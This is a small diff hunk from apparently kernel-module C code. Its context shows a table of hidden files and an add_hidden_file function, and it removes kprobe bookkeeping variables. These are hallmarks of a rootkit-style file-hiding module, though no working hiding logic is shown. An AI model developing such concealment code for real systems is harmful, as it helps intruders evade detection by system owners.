@@ -23,11 +23,6 @@ static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
 static int hidden_count = 0;
 static DEFINE_SPINLOCK(hidden_lock);
 
-/* Kprobe 存储 */
-static struct kprobe *registered_kprobes[64];
-static int kprobe_count = 0;
-static DEFINE_SPINLOCK(kprobe_lock);
-
 int add_hidden_file(const char *name, bool is_dir)
 {
     unsigned long flags;
